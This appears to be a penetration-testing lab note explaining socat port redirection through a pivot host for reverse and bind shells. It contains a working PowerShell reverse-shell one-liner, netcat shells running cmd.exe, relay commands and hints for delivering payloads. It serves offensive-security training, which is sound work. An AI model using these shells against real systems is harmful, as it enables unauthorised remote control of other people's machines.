# Socat Redirection

## 1. Core Concept

`socat` is a bidirectional relay tool — it creates a pipe between two independent network sockets and forwards whatever hits one side to the other. It replaces SSH tunneling when you need a pivot host to blindly redirect raw TCP traffic (e.g. a shell callback) without an SSH session in the loop.

```
socat TCP4-LISTEN:<LISTEN_PORT>,fork TCP4:<DEST_IP>:<DEST_PORT>
```

- `TCP4-LISTEN:<port>` — socat listens here.
- `fork` — spawn a new relay process per connection (so it keeps listening for more).
- `TCP4:<dest_ip>:<dest_port>` — everything received gets forwarded here.

Two shapes: **reverse-shell redirection** (target calls out through the pivot to you) and **bind-shell redirection** (you call in through the pivot to the target).

---

## 2. Socat Redirection with a Reverse Shell

**Scenario:** you own a pivot host (e.g. `Ubuntu server`) that the target *can* reach, but the target has no route to your actual attack host. The target's reverse shell connects to the pivot; socat blindly forwards that connection on to your real listener.

```
Windows Target ──▶ Ubuntu Pivot (socat) ──▶ Attack Host (listener)
```

### Start the socat listener on the pivot

Listens on the pivot's port `8080` and forwards everything to your attack host on port `80`:

```
ubuntu@Webserver:~$ socat TCP4-LISTEN:8080,fork TCP4:10.10.14.18:80
```

### Start your listener on the attack host

Plain `nc`/`ncat` listener works fine — no framework required:

```
nc -lvnp 80
```

### Generate and deliver the payload

Any reverse-shell payload that connects out to `<pivot_ip>:8080` works — pick whichever fits the target and your delivery method. A couple of lightweight, framework-free options for Windows:

**PowerShell one-liner** (paste/run directly, or drop as a `.ps1`):

```powershell
$client = New-Object System.Net.Sockets.TCPClient('<PIVOT_IP>',8080);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

**nc.exe** (if you can drop a static Netcat-for-Windows binary on target):

```
nc.exe <PIVOT_IP> 8080 -e cmd.exe
```

Transfer whichever payload you choose to the target using standard file-transfer techniques (SMB share, `certutil`, `Invoke-WebRequest`, hosted Python `http.server` on the pivot, etc.).

### Result

Once executed, the target connects to the pivot on `8080`; socat forwards that connection to your attack host on `80`; your `nc -lvnp 80` catches the shell — exactly as if the target had connected to you directly.

```
whoami
INLANEFREIGHT\victor
```

---

## 3. Socat Redirection with a Bind Shell

**Scenario:** the target starts its own listener and waits for an inbound connection (bind shell) instead of calling out. You can't reach the target directly, but the pivot can. Socat on the pivot relays your inbound connection request through to the target's bind port.

```
Attack Host ──▶ Ubuntu Pivot (socat) ──▶ Windows Target (bind listener)
```

### Generate the bind-shell payload

Any Windows bind-shell payload that listens on a chosen port works. A framework-free option using `nc.exe`:

```
nc.exe -lvnp 8443 -e cmd.exe
```

(A raw compiled bind-shell binary, or a PowerShell bind-shell script, works the same way — the listening port on the target is what matters here.)

Execute it on the target so it starts listening on `8443`.

### Start the socat redirector on the pivot

Listens on the pivot's `8080` and forwards to the target's bind port (`172.16.5.19:8443`):

```
ubuntu@Webserver:~$ socat TCP4-LISTEN:8080,fork TCP4:172.16.5.19:8443
```

### Connect from your attack host

Connect to the **pivot's** address/port — socat relays it through to the target's bind shell:

```
nc <PIVOT_IP> 8080
```

### Result

```
whoami
INLANEFREIGHT\victor
```

Your connection to the pivot on `8080` is transparently forwarded to the target's `8443` bind listener — you get an interactive shell as if you'd connected to the target directly.

---

## 4. Reverse vs. Bind — Which Socat Setup to Use

| Scenario                                             | Direction                        | Socat command shape                                  |
| ----------------------------------------------------- | --------------------------------- | ------------------------------------------------------ |
| Target can reach the pivot, but not your attack host  | Reverse (target → pivot → you)    | `socat TCP4-LISTEN:<relay_port>,fork TCP4:<YOUR_IP>:<YOUR_PORT>` |
| You can reach the pivot, pivot can reach the target    | Bind (you → pivot → target)       | `socat TCP4-LISTEN:<relay_port>,fork TCP4:<TARGET_IP>:<TARGET_PORT>` |

Both cases boil down to the same thing: socat just glues two TCP sockets together. Whether it's "reverse" or "bind" only depends on which side initiates the outbound connection first.

---

## 5. Core Things to Remember

- `socat TCP4-LISTEN:<port>,fork TCP4:<dest>:<dest_port>` is the entire technique — memorize this one line.
- `fork` is essential — without it, socat exits after the first relayed connection instead of staying up for more.
- No SSH session or tunnel is needed on the pivot for this to work — just a running `socat` process, so it's useful when you have execution on the pivot but not full SSH port-forwarding control (or want traffic that doesn't ride inside an SSH channel).
- Reverse-shell redirection: target calls the pivot, pivot forwards to you. Bind-shell redirection: you call the pivot, pivot forwards to the target.
- You don't need any particular payload framework for either side — a plain `nc`/`nc.exe` listener or connect-back, or a short PowerShell script, does the job. The redirection technique is independent of what generates the shell.
- Always start the relay/listener chain in the right order: listener → redirector → trigger the payload last.
